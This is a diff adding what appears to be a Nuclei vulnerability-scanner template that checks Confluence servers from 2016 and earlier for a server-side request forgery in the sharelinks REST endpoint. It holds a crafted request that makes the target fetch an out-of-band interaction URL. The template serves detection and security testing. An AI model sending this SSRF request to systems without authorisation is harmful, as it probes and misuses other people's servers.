@@ -1,0 +1,20 @@
+http:
+- matchers:
+  - part: interactsh_protocol
+    type: word
+    words:
+    - http
+  method: GET
+  path:
+  - '{{BaseURL}}/rest/sharelinks/1.0/link?url=https://{{interactsh-url}}/'
+id: confluence-ssrf-sharelinks
+info:
+  author: TechbrunchFR
+  description: Vulnerable should be Confluence versions released from 2016 November
+    and older
+  name: Confluence SSRF in sharelinks
+  reference:
+  - https://bitbucket.org/atlassian/confluence-business-blueprints/pull-requests/144/issue-60-conf-45342-ssrf-in-sharelinks
+  - https://github.com/assetnote/blind-ssrf-chains#confluence
+  severity: medium
+  tags: confluence,atlassian,ssrf,jira,oast
